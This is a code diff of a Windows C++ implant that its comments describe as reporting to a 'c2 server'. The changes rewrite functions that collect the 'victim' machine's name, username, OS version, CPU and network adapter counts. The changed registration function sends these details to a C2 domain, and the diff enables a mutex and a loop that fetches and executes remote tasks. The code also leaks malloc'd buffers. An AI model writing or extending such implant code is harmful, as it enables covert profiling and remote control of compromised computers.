@@ -21,62 +21,31 @@ int port = 5000;
 std::string agentId;
 DWORD sleepTime = 10 * 1000;
 
-// generate a random agent id of size digits
-std::string generateRandomId(int size) {
-    std::string id = "";
-    for (int i = 0; i < size; i++) {
-        id += std::to_string(rand() % 10);
-    }
-    return id;
-}
-
-// register the agent on the c2 server
-BOOL registerAgent() {
-    std::string name = exec_shell(CommonCmd::whoami);
-    int cpuCount = std::stoi(exec_shell(CommonCmd::cpu_num));
-    
-    json jsonPayload = {
-        {"whoami", name},
-        {"agent_id", agentId},
-        {"password", password},
-        {"cpus", cpuCount}
-    };
-
-    std::string jsonString = jsonPayload.dump();
-    std::string response = httpPost(c2Domain, port, registerURI, jsonString);
-    std::cout << response << std::endl;
-
-    json jsonResponse = json::parse(response);
-
-    if (jsonResponse["status"] == "ok") {
-        return TRUE;
-    } else {
-        return FALSE;
-    }
-}
-
 // find the name of victim computer
 std::string getComputerName() {
 
-    std::string buf;
-    buf.resize(BUF_SIZE);
+    std::string res;
+    char *buf = (char *) malloc(BUF_SIZE);
     DWORD bufSize = BUF_SIZE;
-    GetComputerNameA(&buf[0], &bufSize);
-    buf.shrink_to_fit();
+    GetComputerNameA(buf, &bufSize);
     
-    return buf;
+    res.append(buf);
+    
+    return res;
 }
 
 // find the username of victim computer
 std::string getUserName() {
 
-    std::string buf;
-    buf.resize(BUF_SIZE);
+    std::string res;
+    char *buf = (char *) malloc(BUF_SIZE);
+
     std::string name = "USERNAME";
-    GetEnvironmentVariableA(&name[0], &buf[0], DWORD(BUF_SIZE));
-    buf.shrink_to_fit();
+    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
     
-    return buf;
+    res.append(buf);
+    
+    return res;
 }
 
 //find the windows version running on victim machine
@@ -99,38 +68,43 @@ std::string getWindowsVer() {
     if (dwVersion < 0x80000000)              
         dwBuild = (DWORD)(HIWORD(dwVersion));
 
-    std::string buf;
-    buf.resize(BUF_SIZE);
-    sprintf(&buf[0], "%d.%d (%d)", dwMajorVersion, dwMinorVersion, dwBuild);
-    buf.shrink_to_fit();
+    std::string res;
+    char *buf = (char *) malloc(BUF_SIZE);
 
-    return buf;
+    sprintf(buf, "%d.%d (%d)", dwMajorVersion, dwMinorVersion, dwBuild);
+
+    res.append(buf);
+
+    return res;
 
 }
 
 //find the victim's profile id
 std::string getProfileID() {
-    std::string buf;
-    buf.resize(BUF_SIZE);
+    std::string res;
+    char *buf = (char *) malloc(BUF_SIZE);
+    
     std::string name = "WT_PROFILE_ID";
-    GetEnvironmentVariableA(&name[0], &buf[0], DWORD(BUF_SIZE));
-    buf.shrink_to_fit();
-    return buf;
+    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
+    
+    res.append(buf);
+    return res;
 }
 
 // find number of processors in the victim machine
 std::string getCPUNum() {
-    std::string buf;
-    buf.resize(BUF_SIZE);
+    std::string res;
+    char *buf = (char *) malloc(BUF_SIZE);
+    
     std::string name = "NUMBER_OF_PROCESSORS";
-    GetEnvironmentVariableA(&name[0], &buf[0], DWORD(BUF_SIZE));
-    buf.shrink_to_fit();
-    return buf;
+    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
+    
+    res.append(buf);
+    return res;
 }
 
-std::string getNetworkInterfaces() {
-    std::string buf;
-    buf.resize(BUF_SIZE);
+std::string getNetworkInterfaceNum() {
+    char *buf = (char *) malloc(BUF_SIZE);
 
     PIP_INTERFACE_INFO pInfo;
     pInfo = (IP_INTERFACE_INFO *) malloc( sizeof(IP_INTERFACE_INFO) );
@@ -145,23 +119,49 @@ std::string getNetworkInterfaces() {
 
     // GetInterfaceInfo to get the actual data we need
     if ((dwRetVal = GetInterfaceInfo(pInfo, &ulOutBufLen)) == NO_ERROR ) {
-        printf("\tAdapter Name: %ws\n", pInfo->Adapter[0].Name);
-        printf("\tAdapter Index: %ld\n", pInfo->Adapter[0].Index);
-        printf("\tNum Adapters: %ld\n", pInfo->NumAdapters);
 
+        itoa(pInfo->NumAdapters, buf, 10);
         // free memory allocated
         free(pInfo);
         pInfo = NULL;
     } else if (dwRetVal == ERROR_NO_DATA) {
-        printf("There are no network adapters with IPv4 enabled on the local system\n");
+        itoa(0, buf, 10);
     } else {
         //failed to run GetInterfaceInfo
         return buf;
     }
     
-    return buf;
+    std::string res;
+    res.append(buf);
+    return res;
 }
 
+// register the agent on the c2 server
+BOOL registerAgent() {
+    
+    json jsonPayload = {
+        {"agent_id", getProfileID()},
+        {"whoami", getComputerName()},
+        {"username", getUserName()},
+        {"password", password},
+        {"cpus", getCPUNum()},
+        {"osVersion", getWindowsVer()},
+        {"adaptors", getNetworkInterfaceNum()}
+    };
+
+    std::string jsonString = jsonPayload.dump();
+
+    std::string response = httpPost(c2Domain, port, registerURI, jsonString);
+    std::cout << response << std::endl;
+
+    json jsonResponse = json::parse(response);
+
+    if (jsonResponse["status"] == "ok") {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
 
 // execute the list of commands and send the result back to the server
 void executeCommands(std::vector<std::string> cmds) {
@@ -206,31 +206,27 @@ void getTasksAndExecute() {
 int main(int argc, char* argv[]){
 
     // use a mutex to prevent multiple instances of the implant
-    // LPCSTR szUniqueNamedMutex = "magic_conch";
-    // HANDLE hHandle = CreateMutexA( NULL, TRUE, szUniqueNamedMutex );
-    // if( ERROR_ALREADY_EXISTS == GetLastError() )
-    // {
-    //     // Program already running somewhere
-    //     return 0; // Exit program
-    // }
+    LPCSTR szUniqueNamedMutex = "magic_conch";
+    HANDLE hHandle = CreateMutexA( NULL, TRUE, szUniqueNamedMutex );
+    if( ERROR_ALREADY_EXISTS == GetLastError() )
+    {
+        // Program already running somewhere
+        return 0; // Exit program
+    }
 
-    // agentId = generateRandomId(10);
-    // registerAgent();
+    registerAgent();
 
-    // int i = 3;
-    // while(i > 0) {
-    //     std::cout << "wake up" << std::endl;
-    //     getTasksAndExecute();
-    //     Sleep(sleepTime);
-    //     i--;
-    // }
+    int i = 3;
+    while(i > 0) {
+        std::cout << "wake up" << std::endl;
+        getTasksAndExecute();
+        Sleep(sleepTime);
+        i--;
+    }
 
-    // // Upon app closing:
-    // ReleaseMutex( hHandle ); // Explicitly release mutex
-    // CloseHandle( hHandle ); // close handle before terminating
-
-    // std::cout << getGUID() << std::endl;
-    getNetworkInterfaces();
+    // Upon app closing:
+    ReleaseMutex( hHandle ); // Explicitly release mutex
+    CloseHandle( hHandle ); // close handle before terminating
 
     return 0;
 }
